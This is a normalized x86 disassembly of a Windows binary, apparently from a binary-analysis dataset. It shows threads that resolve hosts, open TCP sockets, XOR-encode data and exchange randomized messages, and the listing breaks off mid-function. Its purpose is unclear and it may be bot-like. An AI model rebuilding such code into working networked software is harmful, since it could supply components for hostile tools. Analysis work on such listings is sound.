mov [ ebp - 0x20 ] ecx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx [ ebp - 0x18 ]
mov al [ edx ]
mov [ ebp - 0x21 ] al
mov ecx [ ebp - 0x1c ]
mov dl [ ebp - 0x21 ]
mov [ ecx ] dl
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0x1c ]
add ecx 0x1
mov [ ebp - 0x1c ] ecx
cmp [ ebp - 0x21 ] 0x0
jne r-xdata
jmp r-xdata
sub_4031e0
push ebp
mov ebp esp
sub esp 0x1dc
push esi
push edi
mov [ ebp - 0x1c4 ] ecx
push 0x11e88
call sub_404fa5
add esp 0x4
mov [ ebp - 0x1b4 ] eax
cmp [ ebp - 0x1b4 ] 0x0
je r-xdata
mov [ ebp - 0x1c8 ] 0x0
mov ecx [ ebp - 0x1b4 ]
call sub_401700
mov [ ebp - 0x1c8 ] eax
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov [ ebp - 0x1c0 ] edx
mov eax [ ebp - 0x1c0 ]
mov [ ebp - 0x1bc ] eax
cmp [ ebp - 0x1bc ] 0x0
je r-xdata
movzx eax [ rw-data ]
cmp eax 0x1
jne r-xdata
mov eax [ ebp - 0x1c8 ]
mov [ ebp - 0x1b0 ] eax
mov ecx [ ebp - 0x1b0 ]
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x1dc ] 0x0
push 0x1
mov ecx [ ebp - 0x1bc ]
call sub_403700
mov [ ebp - 0x1dc ] eax
jmp r-xdata
push 0x3e8
call [ Sleep@IAT ]
jmp r-xdata
mov ecx 0x9
mov esi r--data
lea edi [ ebp - 0x148 ]
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
xor ecx ecx
mov [ ebp - 0x123 ] ecx
mov [ ebp - 0x11f ] ecx
mov [ ebp - 0x11b ] ecx
mov [ ebp - 0x117 ] ecx
mov [ ebp - 0x113 ] ecx
mov [ ebp - 0x10f ] ecx
mov [ ebp - 0x10b ] cx
mov [ ebp - 0x109 ] cl
mov ecx 0xb
mov esi r--data
lea edi [ ebp - 0x108 ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
xor edx edx
mov [ ebp - 0xda ] edx
mov [ ebp - 0xd6 ] edx
mov [ ebp - 0xd2 ] edx
mov [ ebp - 0xce ] edx
mov [ ebp - 0xca ] dx
mov eax [ r--data ]
mov [ ebp - 0xc8 ] eax
mov ecx [ r--data ]
mov [ ebp - 0xc4 ] ecx
mov edx [ r--data ]
mov [ ebp - 0xc0 ] edx
mov eax [ r--data ]
mov [ ebp - 0xbc ] eax
mov ecx [ r--data ]
mov [ ebp - 0xb8 ] ecx
mov dx [ r--data ]
mov [ ebp - 0xb4 ] dx
push 0x2a
push 0x0
lea eax [ ebp - 0xb2 ]
push eax
call sub_40a4d0
add esp 0xc
mov ecx [ r--data ]
mov [ ebp - 0x88 ] ecx
mov edx [ r--data ]
mov [ ebp - 0x84 ] edx
mov eax [ r--data ]
mov [ ebp - 0x80 ] eax
mov ecx [ r--data ]
mov [ ebp - 0x7c ] ecx
mov edx [ r--data ]
mov [ ebp - 0x78 ] edx
mov al [ r--data ]
mov [ ebp - 0x74 ] al
push 0x2b
push 0x0
lea ecx [ ebp - 0x73 ]
push ecx
call sub_40a4d0
add esp 0xc
mov edx [ r--data ]
mov [ ebp - 0x48 ] edx
mov eax [ r--data ]
mov [ ebp - 0x44 ] eax
mov ecx [ r--data ]
mov [ ebp - 0x40 ] ecx
mov edx [ r--data ]
mov [ ebp - 0x3c ] edx
mov eax [ r--data ]
mov [ ebp - 0x38 ] eax
mov cx [ r--data ]
mov [ ebp - 0x34 ] cx
push 0x2a
push 0x0
lea edx [ ebp - 0x32 ]
push edx
call sub_40a4d0
add esp 0xc
mov [ ebp - 0x14c ] 0x0
jmp r-xdata
xor eax eax
pop edi
pop esi
mov esp ebp
pop ebp
retn
movzx edx [ rw-data ]
test edx edx
je r-xdata
cmp [ ebp - 0x14c ] 0x5
jge r-xdata
mov [ ebp - 0x150 ] 0x0
jmp r-xdata
cmp [ ebp - 0x150 ] 0x10
jge r-xdata
push r--data
mov edx [ ebp - 0x14c ]
shl edx 0x6
lea eax [ ebp + edx - 0x148 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_401e00
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
push 0x40
push 0x0
mov edx [ ebp - 0x150 ]
shl edx 0x6
mov eax [ ebp - 0x4 ]
lea ecx [ eax + edx + 0x11a84 ]
push ecx
call sub_40a4d0
add esp 0xc
jmp r-xdata
mov [ ebp - 0x154 ] 0x0
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x150 ]
add ecx 0x1
mov [ ebp - 0x150 ] ecx
cmp [ ebp - 0x154 ] 0x10
jge r-xdata
mov eax [ ebp - 0x14c ]
add eax 0x1
mov [ ebp - 0x14c ] eax
push 0x1388
call [ Sleep@IAT ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
shl edx 0x6
mov eax [ ebp - 0x4 ]
lea ecx [ eax + edx + 0x11a84 ]
mov [ ebp - 0x160 ] ecx
mov edx [ ebp - 0x160 ]
mov [ ebp - 0x1cc ] edx
mov eax [ ebp - 0x1cc ]
add eax 0x1
mov [ ebp - 0x1d0 ] eax
mov ecx [ ebp - 0x1cc ]
mov dl [ ecx ]
mov [ ebp - 0x1d1 ] dl
add [ ebp - 0x1cc ] 0x1
cmp [ ebp - 0x1d1 ] 0x0
jne r-xdata
mov eax [ ebp - 0x1cc ]
sub eax [ ebp - 0x1d0 ]
mov [ ebp - 0x1d8 ] eax
mov ecx [ ebp - 0x1d8 ]
mov [ ebp - 0x158 ] ecx
cmp [ ebp - 0x158 ] 0x0
jne r-xdata
mov edx [ ebp - 0x160 ]
push edx
call sub_402e80
add esp 0x4
mov [ ebp - 0x15c ] eax
cmp [ ebp - 0x15c ] 0x0
je r-xdata
jmp r-xdata
mov [ ebp - 0x1a8 ] 0x0
xor eax eax
mov [ ebp - 0x1a7 ] eax
mov [ ebp - 0x1a3 ] eax
mov [ ebp - 0x19f ] eax
mov [ ebp - 0x19b ] eax
mov [ ebp - 0x197 ] eax
mov [ ebp - 0x193 ] eax
mov [ ebp - 0x18f ] eax
mov [ ebp - 0x18b ] ax
mov [ ebp - 0x189 ] al
mov [ ebp - 0x184 ] 0x0
xor ecx ecx
mov [ ebp - 0x183 ] ecx
mov [ ebp - 0x17f ] ecx
mov [ ebp - 0x17b ] ecx
mov [ ebp - 0x177 ] ecx
mov [ ebp - 0x173 ] ecx
mov [ ebp - 0x16f ] ecx
mov [ ebp - 0x16b ] ecx
mov [ ebp - 0x167 ] cx
mov [ ebp - 0x165 ] cl
lea edx [ ebp - 0x184 ]
push edx
lea eax [ ebp - 0x1a8 ]
push eax
mov ecx [ ebp - 0x160 ]
push ecx
call sub_403100
add esp 0xc
push 0x10
call sub_404fa5
add esp 0x4
mov [ ebp - 0x1b8 ] eax
mov edx [ ebp - 0x1b8 ]
mov [ ebp - 0x164 ] edx
lea eax [ ebp - 0x1a8 ]
push eax
call [ inet_addr@IAT ]
mov ecx [ ebp - 0x164 ]
mov [ ecx ] eax
lea edx [ ebp - 0x184 ]
push edx
call sub_404b8c
add esp 0x4
mov ecx [ ebp - 0x164 ]
mov [ ecx + 0x4 ] ax
mov edx [ ebp - 0x164 ]
mov [ edx + 0xc ] 0x1
mov eax [ ebp - 0x164 ]
mov [ eax + 0xd ] 0x1
movzx ecx [ rw-data ]
mov edx [ ebp - 0x164 ]
mov [ edx + 0x8 ] ecx
mov eax [ ebp - 0x164 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
jmp r-xdata
mov ecx [ ebp - 0x154 ]
add ecx 0x1
mov [ ebp - 0x154 ] ecx
lea edx [ ebp - 0x188 ]
push edx
push 0x0
mov eax [ ebp - 0x164 ]
push eax
push sub_402b90
push 0x0
push 0x0
call [ CreateThread@IAT ]
mov [ ebp - 0x1ac ] eax
mov ecx [ ebp - 0x1ac ]
push ecx
call [ CloseHandle@IAT ]
jmp r-xdata
mov ecx [ ebp - 0x164 ]
mov [ ecx + 0x8 ] 0xa
sub_403700
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_402660
mov eax [ ebp + 0x8 ]
and eax 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x4 ]
push ecx
call sub_404977
add esp 0x4
sub_4037b0
push ebp
mov ebp esp
sub esp 0x18
mov [ ebp - 0x18 ] ecx
mov [ rw-data ] 0x1
mov [ rw-data ] 0x1
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov ecx [ ebp - 0x18 ]
push ecx
push sub_403790
push 0x0
push 0x0
call [ CreateThread@IAT ]
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
push edx
call [ CloseHandle@IAT ]
push 0x3e8
call [ Sleep@IAT ]
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov ecx [ ebp - 0x18 ]
push ecx
push sub_403730
push 0x0
push 0x0
call [ CreateThread@IAT ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
push edx
call [ CloseHandle@IAT ]
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov ecx [ ebp - 0x18 ]
push ecx
push sub_403750
push 0x0
push 0x0
call [ CreateThread@IAT ]
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0xc ]
push edx
call [ CloseHandle@IAT ]
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov ecx [ ebp - 0x18 ]
push ecx
push sub_403770
push 0x0
push 0x0
call [ CreateThread@IAT ]
mov [ ebp - 0x14 ] eax
mov edx [ ebp - 0x14 ]
push edx
call [ CloseHandle@IAT ]
mov esp ebp
pop ebp
retn
sub_403880
push ebp
mov ebp esp
sub esp 0x4c
mov [ ebp - 0x20 ] 0x0
xor eax eax
mov [ ebp - 0x1f ] eax
mov [ ebp - 0x1b ] eax
mov [ ebp - 0x17 ] eax
mov [ ebp - 0x13 ] eax
mov [ ebp - 0xf ] eax
mov [ ebp - 0xb ] eax
mov [ ebp - 0x7 ] eax
mov [ ebp - 0x3 ] ax
mov [ ebp - 0x1 ] al
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0x30 ] ecx
mov edx [ ebp - 0x30 ]
add edx 0x1
mov [ ebp - 0x34 ] edx
mov eax [ ebp - 0x30 ]
mov cl [ eax ]
mov [ ebp - 0x35 ] cl
add [ ebp - 0x30 ] 0x1
cmp [ ebp - 0x35 ] 0x0
jne r-xdata
mov edx [ ebp - 0x30 ]
sub edx [ ebp - 0x34 ]
mov [ ebp - 0x3c ] edx
mov eax [ ebp + 0x14 ]
add eax [ ebp - 0x3c ]
mov [ ebp - 0x24 ] eax
mov ecx [ ebp + 0x8 ]
push ecx
push r--data
lea edx [ ebp - 0x20 ]
push edx
call sub_404a12
add esp 0xc
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebp + 0x14 ]
push ecx
call sub_4021a0
add esp 0x8
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
je r-xdata
xor eax eax
lea edx [ ebp - 0x20 ]
mov [ ebp - 0x40 ] edx
mov eax [ ebp - 0x40 ]
add eax 0x1
mov [ ebp - 0x44 ] eax
mov ecx [ ebp - 0x40 ]
mov dl [ ecx ]
mov [ ebp - 0x45 ] dl
add [ ebp - 0x40 ] 0x1
cmp [ ebp - 0x45 ] 0x0
jne r-xdata
mov eax [ ebp - 0x40 ]
sub eax [ ebp - 0x44 ]
mov [ ebp - 0x4c ] eax
mov ecx [ ebp - 0x28 ]
add ecx [ ebp - 0x4c ]
mov [ ebp - 0x28 ] ecx
mov edx [ ebp - 0x28 ]
mov [ ebp - 0x2c ] edx
mov edx [ ebp - 0x28 ]
sub edx [ ebp - 0x2c ]
push edx
mov eax [ ebp - 0x2c ]
push eax
mov ecx [ ebp + 0x10 ]
push ecx
call sub_404e30
add esp 0xc
mov eax [ ebp - 0x28 ]
sub eax [ ebp - 0x2c ]
jmp r-xdata
mov eax [ ebp - 0x28 ]
cmp eax [ ebp - 0x24 ]
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x28 ]
add ecx 0x1
mov [ ebp - 0x28 ] ecx
jmp r-xdata
mov eax [ ebp - 0x28 ]
movsx ecx [ eax ]
movsx edx [ ebp + 0xc ]
cmp ecx edx
je r-xdata
sub_403990
push ebp
mov ebp esp
sub esp 0x30
mov [ ebp - 0x4 ] 0x80004005
mov [ ebp - 0x30 ] 0x0
xor eax eax
mov [ ebp - 0x24 ] ax
xor ecx ecx
mov [ ebp - 0x22 ] ecx
mov [ ebp - 0x1e ] ecx
mov [ ebp - 0x1a ] ecx
mov [ ebp - 0x16 ] cx
mov [ ebp - 0x2c ] 0x10
mov edx 0x2
mov [ ebp - 0x24 ] dx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x20 ] eax
movzx ecx [ ebp + 0xc ]
push ecx
call [ htons@IAT ]
mov [ ebp - 0x22 ] ax
mov [ ebp - 0xc ] 0x0
push 0x6
push 0x1
push 0x2
call [ socket@IAT ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0xffffffff
jne r-xdata
mov [ ebp - 0x8 ] 0x2710
push 0x4
lea edx [ ebp - 0x8 ]
push edx
push 0x1005
push 0xffff
mov eax [ ebp - 0xc ]
push eax
call [ setsockopt@IAT ]
push 0x4
lea ecx [ ebp - 0x8 ]
push ecx
push 0x1006
push 0xffff
mov edx [ ebp - 0xc ]
push edx
call [ setsockopt@IAT ]
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x14 ] 0x4
mov eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x28 ]
push ecx
push 0x4
push 0xffff
mov edx [ ebp - 0xc ]
push edx
call [ setsockopt@IAT ]
mov eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x28 ]
push ecx
push 0xffffff7f
push 0xffff
mov edx [ ebp - 0xc ]
push edx
call [ setsockopt@IAT ]
mov eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x24 ]
push ecx
mov edx [ ebp - 0xc ]
push edx
call [ connect@IAT ]
mov [ ebp - 0x30 ] eax
cmp [ ebp - 0x30 ] 0xffffffff
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ ebp - 0xc ]
push eax
call [ closesocket@IAT ]
xor eax eax
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_403ab0
push ebp
mov ebp esp
sub esp 0x34
mov [ ebp - 0x4 ] 0x80004005
mov [ ebp - 0x30 ] 0x0
xor eax eax
mov [ ebp - 0x24 ] ax
xor ecx ecx
mov [ ebp - 0x22 ] ecx
mov [ ebp - 0x1e ] ecx
mov [ ebp - 0x1a ] ecx
mov [ ebp - 0x16 ] cx
mov [ ebp - 0x2c ] 0x10
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov edx 0x2
mov [ ebp - 0x24 ] dx
mov eax [ ebp + 0x8 ]
push eax
call [ inet_addr@IAT ]
mov [ ebp - 0x34 ] eax
cmp [ ebp - 0x34 ] 0xffffffff
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x20 ] 0xffffffff
jne r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call [ gethostbyname@IAT ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
movzx ecx [ ebp + 0xc ]
push ecx
call [ htons@IAT ]
mov [ ebp - 0x22 ] ax
mov [ ebp - 0xc ] 0x0
push 0x6
push 0x1
push 0x2
call [ socket@IAT ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0xffffffff
jne r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ edx + 0xc ]
mov ecx [ eax ]
mov edx [ ecx ]
mov [ ebp - 0x34 ] edx
xor eax eax
jmp r-xdata
mov [ ebp - 0x8 ] 0x2710
push 0x4
lea edx [ ebp - 0x8 ]
push edx
push 0x1005
push 0xffff
mov eax [ ebp - 0xc ]
push eax
call [ setsockopt@IAT ]
push 0x4
lea ecx [ ebp - 0x8 ]
push ecx
push 0x1006
push 0xffff
mov edx [ ebp - 0xc ]
push edx
call [ setsockopt@IAT ]
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x14 ] 0x4
mov eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x28 ]
push ecx
push 0x4
push 0xffff
mov edx [ ebp - 0xc ]
push edx
call [ setsockopt@IAT ]
mov eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x28 ]
push ecx
push 0xffffff7f
push 0xffff
mov edx [ ebp - 0xc ]
push edx
call [ setsockopt@IAT ]
mov eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x24 ]
push ecx
mov edx [ ebp - 0xc ]
push edx
call [ connect@IAT ]
mov [ ebp - 0x30 ] eax
cmp [ ebp - 0x30 ] 0xffffffff
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ ebp - 0xc ]
push eax
call [ closesocket@IAT ]
xor eax eax
jmp r-xdata
sub_403c30
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp + 0x8 ]
imul eax [ ebp - 0x4 ]
cdq
idiv [ ebp + 0x10 ]
mov eax edx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0xc ]
and eax 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
imul eax [ ebp + 0x8 ]
cdq
idiv [ ebp + 0x10 ]
mov [ ebp + 0x8 ] edx
mov eax [ ebp + 0xc ]
cdq
sub eax edx
sar eax 0x1
mov [ ebp + 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
imul eax [ ebp + 0x8 ]
cdq
idiv [ ebp + 0x10 ]
mov [ ebp - 0x4 ] edx
cmp [ ebp + 0xc ] 0x1
jle r-xdata
sub_403cb0
push ebp
mov ebp esp
sub esp 0x64
mov [ ebp - 0x20 ] 0x0
xor eax eax
mov [ ebp - 0x1f ] eax
mov [ ebp - 0x1b ] eax
mov [ ebp - 0x17 ] eax
mov [ ebp - 0x13 ] eax
mov [ ebp - 0xf ] eax
mov [ ebp - 0xb ] eax
mov [ ebp - 0x7 ] eax
mov [ ebp - 0x3 ] ax
mov [ ebp - 0x1 ] al
mov [ ebp - 0x60 ] 0x0
push 0x3f
push 0x0
lea ecx [ ebp - 0x5f ]
push ecx
call sub_40a4d0
add esp 0xc
mov edx [ ebp + 0x8 ]
push edx
lea eax [ ebp - 0x20 ]
push eax
push 0x2c
push r--data
call sub_403880
add esp 0x10
mov ecx [ ebp + 0x8 ]
push ecx
lea edx [ ebp - 0x60 ]
push edx
push 0x5d
push r--data
call sub_403880
add esp 0x10
mov eax [ ebp + 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
push ecx
push r--data
lea edx [ ebp - 0x60 ]
push edx
call sub_405093
add esp 0x10
lea eax [ ebp - 0x20 ]
push eax
call sub_404b8c
add esp 0x4
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov [ ebp - 0x64 ] 0x0
jmp r-xdata
cmp [ ebp - 0x64 ] 0x5c
jge r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x64 ]
imul eax eax 0xc
mov ecx [ ebp + 0x14 ]
mov edx [ eax + rw-data ]
cmp edx [ ecx ]
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x64 ]
imul eax eax 0xc
mov ecx [ ebp + 0x18 ]
mov edx [ eax + rw-data ]
cmp edx [ ecx ]
jne r-xdata
mov edx [ ebp - 0x64 ]
add edx 0x1
mov [ ebp - 0x64 ] edx
mov eax [ ebp - 0x64 ]
imul eax eax 0xc
mov ecx [ ebp + 0x10 ]
mov edx [ eax + rw-data ]
mov [ ecx ] edx
jmp r-xdata
sub_403da0
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x8 ]
cmp edx [ ebp + 0xc ]
jge r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x8 ]
mov cl [ eax ]
mov [ ebp - 0x9 ] cl
movzx edx [ ebp - 0x9 ]
movzx eax [ ebp + 0x10 ]
xor edx eax
mov ecx [ ebp - 0x4 ]
mov [ ecx ] dl
mov edx [ ebp - 0x4 ]
add edx 0x1
mov [ ebp - 0x4 ] edx
jmp r-xdata
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
sub_403df0
push ebp
mov ebp esp
sub esp 0x768
push esi
push edi
mov [ ebp - 0x540 ] 0x0
push 0x3ff
push 0x0
lea eax [ ebp - 0x53f ]
push eax
call sub_40a4d0
add esp 0xc
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0xac ] 0x0
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x13c ] 0x0
mov [ ebp - 0x24 ] 0x0
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x14 ] 0x0
movzx ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_403990
add esp 0x8
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
push 0x0
push 0x400
lea eax [ ebp - 0x540 ]
push eax
mov ecx [ ebp - 0x1c ]
push ecx
call [ recv@IAT ]
mov [ ebp - 0xb0 ] eax
cmp [ ebp - 0xb0 ] 0xffffffff
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0xb0 ] 0x0
jne r-xdata
mov edx [ ebp - 0x1c ]
push edx
call [ closesocket@IAT ]
mov eax 0x1
jmp r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x18 ]
push ecx
lea edx [ ebp - 0x24 ]
push edx
lea eax [ ebp - 0x13c ]
push eax
lea ecx [ ebp - 0x8 ]
push ecx
lea edx [ ebp - 0x540 ]
push edx
call sub_403cb0
add esp 0x14
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x1c ]
push eax
call [ closesocket@IAT ]
mov eax 0x1
jmp r-xdata
call [ GetTickCount@IAT ]
mov esi eax
call [ GetCurrentThreadId@IAT ]
add esi eax
push esi
call sub_404ab4
add esp 0x4
call sub_404ac6
cdq
mov ecx 0xfe
idiv ecx
add edx 0x1
mov [ ebp - 0x10 ] edx
mov edx [ ebp - 0x8 ]
xor edx [ ebp - 0x10 ]
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x24 ]
push ecx
mov edx [ ebp - 0x10 ]
push edx
call sub_403c90
add esp 0xc
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x748 ] 0x0
push 0x1ff
push 0x0
lea eax [ ebp - 0x747 ]
push eax
call sub_40a4d0
add esp 0xc
mov ecx [ ebp - 0x20 ]
push ecx
mov edx [ ebp - 0x4 ]
push edx
push r--data
lea eax [ ebp - 0x748 ]
push eax
call sub_404a12
add esp 0x10
lea ecx [ ebp - 0x748 ]
mov [ ebp - 0x74c ] ecx
mov edx [ ebp - 0x74c ]
add edx 0x1
mov [ ebp - 0x750 ] edx
mov eax [ ebp - 0x1c ]
push eax
call [ closesocket@IAT ]
mov eax 0x1
jmp r-xdata
mov eax [ ebp - 0x74c ]
mov cl [ eax ]
mov [ ebp - 0x751 ] cl
add [ ebp - 0x74c ] 0x1
cmp [ ebp - 0x751 ] 0x0
jne r-xdata
mov edx [ ebp - 0x74c ]
sub edx [ ebp - 0x750 ]
mov [ ebp - 0x758 ] edx
mov eax [ ebp - 0x758 ]
mov [ ebp - 0xac ] eax
push 0x0
mov ecx [ ebp - 0xac ]
push ecx
lea edx [ ebp - 0x748 ]
push edx
mov eax [ ebp - 0x1c ]
push eax
call [ send@IAT ]
mov [ ebp - 0xb0 ] eax
mov ecx [ ebp - 0xb0 ]
cmp ecx [ ebp - 0xac ]
je r-xdata
mov [ ebp - 0xa8 ] 0x0
push 0x3f
push 0x0
lea eax [ ebp - 0xa7 ]
push eax
call sub_40a4d0
add esp 0xc
call sub_404ac6
push eax
call sub_404ac6
push eax
call sub_404ac6
push eax
call sub_404ac6
push eax
mov ecx [ ebp - 0x4 ]
push ecx
mov edx [ ebp - 0x20 ]
push edx
call [ GetCurrentThreadId@IAT ]
push eax
call [ GetTickCount@IAT ]
push eax
push r--data
lea eax [ ebp - 0xa8 ]
push eax
call sub_404a12
add esp 0x28
mov [ ebp - 0x68 ] 0x0
push 0x3f
push 0x0
lea ecx [ ebp - 0x67 ]
push ecx
call sub_40a4d0
add esp 0xc
mov [ ebp - 0x118 ] 0x0
push 0x3f
push 0x0
lea edx [ ebp - 0x117 ]
push edx
call sub_40a4d0
add esp 0xc
mov [ ebp - 0x138 ] 0x0
xor eax eax
mov [ ebp - 0x137 ] eax
mov [ ebp - 0x133 ] eax
mov [ ebp - 0x12f ] eax
mov [ ebp - 0x12b ] eax
mov [ ebp - 0x127 ] eax
mov [ ebp - 0x123 ] eax
mov [ ebp - 0x11f ] eax
mov [ ebp - 0x11b ] ax
mov [ ebp - 0x119 ] al
call sub_404ac6
push eax
call sub_404ac6
push eax
call sub_404ac6
push eax
call sub_404ac6
push eax
push r--data
lea ecx [ ebp - 0x138 ]
push ecx
call sub_404a12
add esp 0x18
push 0x20
lea edx [ ebp - 0x68 ]
push edx
lea eax [ ebp - 0xa8 ]
push eax
call sub_4012a0
add esp 0xc
push 0x9
lea ecx [ ebp - 0x118 ]
push ecx
lea edx [ ebp - 0x138 ]
push edx
call sub_4012a0
add esp 0xc
call sub_404ac6
cdq
mov ecx 0x64
idiv ecx
mov [ ebp - 0xc ] edx
mov edx [ ebp - 0xc ]
imul edx edx 0x2710
mov [ ebp - 0x544 ] edx
call sub_404ac6
add eax [ ebp - 0x544 ]
mov [ ebp - 0x544 ] eax
lea eax [ ebp - 0x118 ]
push eax
lea ecx [ ebp - 0x68 ]
push ecx
call [ GetTickCount@IAT ]
mov esi eax
call sub_404ac6
add esi eax
push esi
movzx edx [ ebp + 0x10 ]
push edx
mov eax [ ebp - 0x544 ]
push eax
push r--data
push r--data
lea ecx [ ebp - 0x748 ]
push ecx
call sub_404a12
add esp 0x20
lea edx [ ebp - 0x748 ]
mov [ ebp - 0x75c ] edx
mov eax [ ebp - 0x75c ]
add eax 0x1
mov [ ebp - 0x760 ] eax
mov edx [ ebp - 0x1c ]
push edx
call [ closesocket@IAT ]
mov eax 0x1
jmp r-xdata
mov ecx [ ebp - 0x75c ]
mov dl [ ecx ]
mov [ ebp - 0x761 ] dl
add [ ebp - 0x75c ] 0x1
cmp [ ebp - 0x761 ] 0x0
jne r-xdata
mov eax [ ebp - 0x75c ]
sub eax [ ebp - 0x760 ]
mov [ ebp - 0x768 ] eax
mov ecx [ ebp - 0x768 ]
mov [ ebp - 0xac ] ecx
push 0x400
push 0x0
lea edx [ ebp - 0x540 ]
push edx
call sub_40a4d0
add esp 0xc
cmp [ ebp - 0xac ] 0xff
jle r-xdata
mov dl [ ebp - 0xac ]
mov [ ebp - 0x540 ] dl
mov eax [ ebp - 0xac ]
push eax
lea ecx [ ebp - 0x748 ]
push ecx
lea edx [ ebp - 0x53f ]
push edx
call sub_405260
add esp 0xc
mov eax [ ebp - 0xac ]
add eax 0x1
mov [ ebp - 0xac ] eax
mov [ ebp - 0x540 ] 0xff
mov eax [ ebp - 0xac ]
push eax
call [ ntohl@IAT ]
mov [ ebp - 0x53f ] eax
mov ecx [ ebp - 0xac ]
push ecx
lea edx [ ebp - 0x748 ]
push edx
lea eax [ ebp - 0x53b ]
push eax
call sub_405260
add esp 0xc
mov ecx [ ebp - 0xac ]
add ecx 0x5
mov [ ebp - 0xac ] ecx
jmp r-xdata
mov ecx [ ebp - 0x1c ]
push ecx
call [ closesocket@IAT ]
mov eax 0x1
push 0x200
push 0x0
lea ecx [ ebp - 0x748 ]
push ecx
call sub_40a4d0
add esp 0xc
push 0x0
push 0x400
lea edx [ ebp - 0x748 ]
push edx
mov eax [ ebp - 0x1c ]
push eax
call [ recv@IAT ]
mov [ ebp - 0xb0 ] eax
cmp [ ebp - 0xb0 ] 0x1
jle r-xdata
mov [ ebp - 0xd8 ] 0x2
mov [ ebp - 0xd7 ] 0x7b
mov [ ebp - 0xd6 ] 0x7d
mov [ ebp - 0xd5 ] 0x24
mov [ ebp - 0xd4 ] 0x7b
mov [ ebp - 0xd3 ] 0x22
mov [ ebp - 0xd2 ] 0x62
mov [ ebp - 0xd1 ] 0x6f
mov [ ebp - 0xd0 ] 0x64
mov [ ebp - 0xcf ] 0x79
mov [ ebp - 0xce ] 0x22
mov [ ebp - 0xcd ] 0x3a
mov [ ebp - 0xcc ] 0x31
mov [ ebp - 0xcb ] 0x2c
mov [ ebp - 0xca ] 0x22
mov [ ebp - 0xc9 ] 0x74
mov [ ebp - 0xc8 ] 0x61
mov [ ebp - 0xc7 ] 0x67
mov [ ebp - 0xc6 ] 0x22
mov [ ebp - 0xc5 ] 0x3a
mov [ ebp - 0xc4 ] 0x22
